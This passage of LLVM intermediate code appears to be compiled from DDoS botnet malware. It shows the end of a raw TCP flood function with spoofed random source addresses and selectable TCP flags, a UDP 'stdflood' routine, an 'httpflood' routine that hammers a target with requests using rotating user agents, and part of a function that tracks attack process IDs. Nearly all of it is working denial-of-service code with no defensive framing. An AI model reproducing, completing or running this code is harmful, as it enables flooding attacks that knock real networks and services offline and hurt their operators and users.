  br label %66

; <label>:60:                                     ; preds = %56
  %61 = load i32, i32* %11, align 4
  %62 = sub nsw i32 32, %61
  %63 = shl i32 1, %62
  %64 = sub nsw i32 %63, 1
  %65 = xor i32 %64, -1
  store i32 %65, i32* %17, align 4
  br label %66

; <label>:66:                                     ; preds = %60, %59
  %67 = load i32, i32* %9, align 4
  %68 = sext i32 %67 to i64
  %69 = add i64 40, %68
  %70 = call i8* @llvm.stacksave()
  store i8* %70, i8** %18, align 8
  %71 = alloca i8, i64 %69, align 16
  %72 = bitcast i8* %71 to %struct.iphdr*
  store %struct.iphdr* %72, %struct.iphdr** %19, align 8
  %73 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %74 = bitcast %struct.iphdr* %73 to i8*
  %75 = getelementptr i8, i8* %74, i64 20
  %76 = bitcast i8* %75 to %struct.tcphdr*
  store %struct.tcphdr* %76, %struct.tcphdr** %20, align 8
  %77 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %79 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 4
  %81 = load i32, i32* %17, align 4
  %82 = call i32 @getRandomIP(i32 %81)
  %83 = call i32 @htonl(i32 %82) #9
  %84 = load i32, i32* %9, align 4
  %85 = sext i32 %84 to i64
  %86 = add i64 20, %85
  %87 = trunc i64 %86 to i32
  call void @makeIPPacket(%struct.iphdr* %77, i32 %80, i32 %83, i8 zeroext 6, i32 %87)
  %88 = call i32 @rand_cmwc()
  %89 = trunc i32 %88 to i16
  %90 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %91 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %90, i32 0, i32 0
  %92 = bitcast %union.anon* %91 to %struct.anon.0*
  %93 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %92, i32 0, i32 0
  store i16 %89, i16* %93, align 4
  %94 = call i32 @rand_cmwc()
  %95 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %96 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %95, i32 0, i32 0
  %97 = bitcast %union.anon* %96 to %struct.anon.0*
  %98 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %97, i32 0, i32 2
  store i32 %94, i32* %98, align 4
  %99 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %100 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %99, i32 0, i32 0
  %101 = bitcast %union.anon* %100 to %struct.anon.0*
  %102 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %101, i32 0, i32 3
  store i32 0, i32* %102, align 4
  %103 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %104 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %103, i32 0, i32 0
  %105 = bitcast %union.anon* %104 to %struct.anon.0*
  %106 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %105, i32 0, i32 4
  %107 = load i16, i16* %106, align 4
  %108 = and i16 %107, -241
  %109 = or i16 %108, 80
  store i16 %109, i16* %106, align 4
  %110 = load i8*, i8** %10, align 8
  %111 = call i32 @strcmp(i8* %110, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %149, label %113

; <label>:113:                                    ; preds = %66
  %114 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon* %115 to %struct.anon.0*
  %117 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -513
  %120 = or i16 %119, 512
  store i16 %120, i16* %117, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = and i16 %125, -1025
  %127 = or i16 %126, 1024
  store i16 %127, i16* %124, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon* %129 to %struct.anon.0*
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 4
  %132 = load i16, i16* %131, align 4
  %133 = and i16 %132, -257
  %134 = or i16 %133, 256
  store i16 %134, i16* %131, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon* %136 to %struct.anon.0*
  %138 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %137, i32 0, i32 4
  %139 = load i16, i16* %138, align 4
  %140 = and i16 %139, -4097
  %141 = or i16 %140, 4096
  store i16 %141, i16* %138, align 4
  %142 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon* %143 to %struct.anon.0*
  %145 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -2049
  %148 = or i16 %147, 2048
  store i16 %148, i16* %145, align 4
  br label %225

; <label>:149:                                    ; preds = %66
  %150 = load i8*, i8** %10, align 8
  %151 = call i8* @strtok(i8* %150, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #6
  store i8* %151, i8** %21, align 8
  br label %152

; <label>:152:                                    ; preds = %222, %149
  %153 = load i8*, i8** %21, align 8
  %154 = icmp ne i8* %153, null
  br i1 %154, label %155, label %224

; <label>:155:                                    ; preds = %152
  %156 = load i8*, i8** %21, align 8
  %157 = call i32 @strcmp(i8* %156, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %158 = icmp ne i32 %157, 0
  br i1 %158, label %167, label %159

; <label>:159:                                    ; preds = %155
  %160 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i32 0, i32 0
  %162 = bitcast %union.anon* %161 to %struct.anon.0*
  %163 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %162, i32 0, i32 4
  %164 = load i16, i16* %163, align 4
  %165 = and i16 %164, -513
  %166 = or i16 %165, 512
  store i16 %166, i16* %163, align 4
  br label %222

; <label>:167:                                    ; preds = %155
  %168 = load i8*, i8** %21, align 8
  %169 = call i32 @strcmp(i8* %168, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %179, label %171

; <label>:171:                                    ; preds = %167
  %172 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %173 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon* %173 to %struct.anon.0*
  %175 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %174, i32 0, i32 4
  %176 = load i16, i16* %175, align 4
  %177 = and i16 %176, -1025
  %178 = or i16 %177, 1024
  store i16 %178, i16* %175, align 4
  br label %221

; <label>:179:                                    ; preds = %167
  %180 = load i8*, i8** %21, align 8
  %181 = call i32 @strcmp(i8* %180, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i32 0, i32 0)) #10
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %191, label %183

; <label>:183:                                    ; preds = %179
  %184 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon* %185 to %struct.anon.0*
  %187 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %186, i32 0, i32 4
  %188 = load i16, i16* %187, align 4
  %189 = and i16 %188, -257
  %190 = or i16 %189, 256
  store i16 %190, i16* %187, align 4
  br label %220

; <label>:191:                                    ; preds = %179
  %192 = load i8*, i8** %21, align 8
  %193 = call i32 @strcmp(i8* %192, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %194 = icmp ne i32 %193, 0
  br i1 %194, label %203, label %195

; <label>:195:                                    ; preds = %191
  %196 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon* %197 to %struct.anon.0*
  %199 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -4097
  %202 = or i16 %201, 4096
  store i16 %202, i16* %199, align 4
  br label %219

; <label>:203:                                    ; preds = %191
  %204 = load i8*, i8** %21, align 8
  %205 = call i32 @strcmp(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %206 = icmp ne i32 %205, 0
  br i1 %206, label %215, label %207

; <label>:207:                                    ; preds = %203
  %208 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  %210 = bitcast %union.anon* %209 to %struct.anon.0*
  %211 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %210, i32 0, i32 4
  %212 = load i16, i16* %211, align 4
  %213 = and i16 %212, -2049
  %214 = or i16 %213, 2048
  store i16 %214, i16* %211, align 4
  br label %218

; <label>:215:                                    ; preds = %203
  %216 = load i8*, i8** %21, align 8
  %217 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.49, i32 0, i32 0), i8* %216)
  br label %218

; <label>:218:                                    ; preds = %215, %207
  br label %219

; <label>:219:                                    ; preds = %218, %195
  br label %220

; <label>:220:                                    ; preds = %219, %183
  br label %221

; <label>:221:                                    ; preds = %220, %171
  br label %222

; <label>:222:                                    ; preds = %221, %159
  %223 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #6
  store i8* %223, i8** %21, align 8
  br label %152

; <label>:224:                                    ; preds = %152
  br label %225

; <label>:225:                                    ; preds = %224, %113
  %226 = call i32 @rand_cmwc()
  %227 = trunc i32 %226 to i16
  %228 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = bitcast %union.anon* %229 to %struct.anon.0*
  %231 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %230, i32 0, i32 5
  store i16 %227, i16* %231, align 2
  %232 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon* %233 to %struct.anon.0*
  %235 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %234, i32 0, i32 6
  store i16 0, i16* %235, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load i32, i32* %7, align 4
  %241 = icmp eq i32 %240, 0
  br i1 %241, label %242, label %244

; <label>:242:                                    ; preds = %225
  %243 = call i32 @rand_cmwc()
  br label %249

; <label>:244:                                    ; preds = %225
  %245 = load i32, i32* %7, align 4
  %246 = trunc i32 %245 to i16
  %247 = call zeroext i16 @htons(i16 zeroext %246) #9
  %248 = zext i16 %247 to i32
  br label %249

; <label>:249:                                    ; preds = %244, %242
  %250 = phi i32 [ %243, %242 ], [ %248, %244 ]
  %251 = trunc i32 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon* %253 to %struct.anon.0*
  %255 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %254, i32 0, i32 1
  store i16 %251, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %257 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %258 = call zeroext i16 @tcpcsum(%struct.iphdr* %256, %struct.tcphdr* %257)
  %259 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon* %260 to %struct.anon.0*
  %262 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %261, i32 0, i32 6
  store i16 %258, i16* %262, align 4
  %263 = bitcast i8* %71 to i16*
  %264 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 2
  %266 = load i16, i16* %265, align 2
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @csum(i16* %263, i32 %267)
  %269 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = call i64 @time(i64* null) #6
  %272 = load i32, i32* %8, align 4
  %273 = sext i32 %272 to i64
  %274 = add nsw i64 %271, %273
  %275 = trunc i64 %274 to i32
  store i32 %275, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %276

; <label>:276:                                    ; preds = %330, %329, %249
  br label %277

; <label>:277:                                    ; preds = %276
  %278 = load i32, i32* %15, align 4
  %279 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %280 = call i64 @sendto(i32 %278, i8* %71, i64 %69, i32 0, %struct.sockaddr* %279, i32 16)
  %281 = load i32, i32* %17, align 4
  %282 = call i32 @getRandomIP(i32 %281)
  %283 = call i32 @htonl(i32 %282) #9
  %284 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 8
  store i32 %283, i32* %285, align 4
  %286 = call i32 @rand_cmwc()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 3
  store i16 %287, i16* %289, align 4
  %290 = call i32 @rand_cmwc()
  %291 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 0
  %293 = bitcast %union.anon* %292 to %struct.anon.0*
  %294 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %293, i32 0, i32 2
  store i32 %290, i32* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 0
  %299 = bitcast %union.anon* %298 to %struct.anon.0*
  %300 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %299, i32 0, i32 0
  store i16 %296, i16* %300, align 4
  %301 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon* %302 to %struct.anon.0*
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 6
  store i16 0, i16* %304, align 4
  %305 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %306 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %307 = call zeroext i16 @tcpcsum(%struct.iphdr* %305, %struct.tcphdr* %306)
  %308 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon* %309 to %struct.anon.0*
  %311 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %310, i32 0, i32 6
  store i16 %307, i16* %311, align 4
  %312 = bitcast i8* %71 to i16*
  %313 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 2
  %315 = load i16, i16* %314, align 2
  %316 = zext i16 %315 to i32
  %317 = call zeroext i16 @csum(i16* %312, i32 %316)
  %318 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 7
  store i16 %317, i16* %319, align 2
  %320 = load i32, i32* %23, align 4
  %321 = load i32, i32* %13, align 4
  %322 = icmp eq i32 %320, %321
  br i1 %322, label %323, label %330

; <label>:323:                                    ; preds = %277
  %324 = call i64 @time(i64* null) #6
  %325 = load i32, i32* %22, align 4
  %326 = sext i32 %325 to i64
  %327 = icmp sgt i64 %324, %326
  br i1 %327, label %328, label %329

; <label>:328:                                    ; preds = %323
  br label %333

; <label>:329:                                    ; preds = %323
  store i32 0, i32* %23, align 4
  br label %276

; <label>:330:                                    ; preds = %277
  %331 = load i32, i32* %23, align 4
  %332 = add i32 %331, 1
  store i32 %332, i32* %23, align 4
  br label %276

; <label>:333:                                    ; preds = %328
  %334 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %334)
  br label %335

; <label>:335:                                    ; preds = %333, %55, %49, %42
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

declare i32 @printf(i8*, ...) #5

; Function Attrs: noinline nounwind uwtable
define void @stdflood(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %15, i32* %9, align 4
  %16 = call i64 @time(i64* null) #6
  store i64 %16, i64* %10, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %12, align 8
  %19 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %12, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %12, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #6
  %31 = load %struct.hostent*, %struct.hostent** %12, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %6, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %13, align 4
  br label %39

; <label>:39:                                     ; preds = %62, %4
  %40 = load i32, i32* %13, align 4
  %41 = icmp uge i32 %40, 50
  br i1 %41, label %42, label %62

; <label>:42:                                     ; preds = %39
  %43 = call i8* @makestring()
  store i8* %43, i8** %14, align 8
  %44 = load i32, i32* %9, align 4
  %45 = load i8*, i8** %14, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @send(i32 %44, i8* %45, i64 %47, i32 0)
  %49 = load i32, i32* %9, align 4
  %50 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %51 = call i32 @connect(i32 %49, %struct.sockaddr* %50, i32 16)
  %52 = call i64 @time(i64* null) #6
  %53 = load i64, i64* %10, align 8
  %54 = load i32, i32* %7, align 4
  %55 = sext i32 %54 to i64
  %56 = add nsw i64 %53, %55
  %57 = icmp sge i64 %52, %56
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %42
  %59 = load i32, i32* %9, align 4
  %60 = call i32 @close(i32 %59)
  call void @_exit(i32 0) #11
  unreachable

; <label>:61:                                     ; preds = %42
  store i32 0, i32* %13, align 4
  br label %62

; <label>:62:                                     ; preds = %61, %39
  %63 = load i32, i32* %13, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %13, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #5

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #2

declare i64 @send(i32, i8*, i64, i32) #5

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i32 @close(i32) #5

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i32 0, i32 0)) #6
  call void @exit(i32 1) #12
  unreachable

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* %18, i8* %20, i64 %24) #6
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 zeroext %25) #9
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 2, i32 1, i32 6) #6
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 %30, i32 6, i32 1, i8* %31, i32 4) #6
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i32 0, i32 0))
  call void @exit(i32 1) #12
  unreachable

; <label>:36:                                     ; preds = %13
  %37 = load i32, i32* %8, align 4
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %39 = call i32 @connect(i32 %37, %struct.sockaddr* %38, i32 16)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0))
  call void @exit(i32 1) #12
  unreachable

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %8, align 4
  ret i32 %43
}

; Function Attrs: nounwind
declare void @herror(i8*) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

declare void @perror(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @httpflood(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #6
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %63, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %66

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #6
  %34 = srem i32 %33, 39
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [39 x i8*], [39 x i8*]* @UserAgents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.53, i32 0, i32 0), i8* %30, i8* %31, i8* %32, i8* %37) #6
  br label %39

; <label>:39:                                     ; preds = %61, %28
  %40 = load i32, i32* %15, align 4
  %41 = sext i32 %40 to i64
  %42 = call i64 @time(i64* null) #6
  %43 = icmp sgt i64 %41, %42
  br i1 %43, label %44, label %62

; <label>:44:                                     ; preds = %39
  %45 = load i8*, i8** %8, align 8
  %46 = load i16, i16* %9, align 2
  %47 = call i32 @socket_connect(i8* %45, i16 zeroext %46)
  store i32 %47, i32* %13, align 4
  %48 = load i32, i32* %13, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %50, label %61

; <label>:50:                                     ; preds = %44
  %51 = load i32, i32* %13, align 4
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %54 = call i64 @strlen(i8* %53) #10
  %55 = call i64 @write(i32 %51, i8* %52, i64 %54)
  %56 = load i32, i32* %13, align 4
  %57 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %58 = call i64 @read(i32 %56, i8* %57, i64 1)
  %59 = load i32, i32* %13, align 4
  %60 = call i32 @close(i32 %59)
  br label %61

; <label>:61:                                     ; preds = %50, %44
  br label %39

; <label>:62:                                     ; preds = %39
  call void @exit(i32 0) #12
  unreachable
                                                  ; No predecessors!
  %64 = load i32, i32* %14, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %14, align 4
  br label %24

; <label>:66:                                     ; preds = %24
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

declare i64 @write(i32, i8*, i64) #5

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numattackpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numattackpids, align 8
  %13 = load i64, i64* @numattackpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #6
  %17 = bitcast i8* %16 to i32*
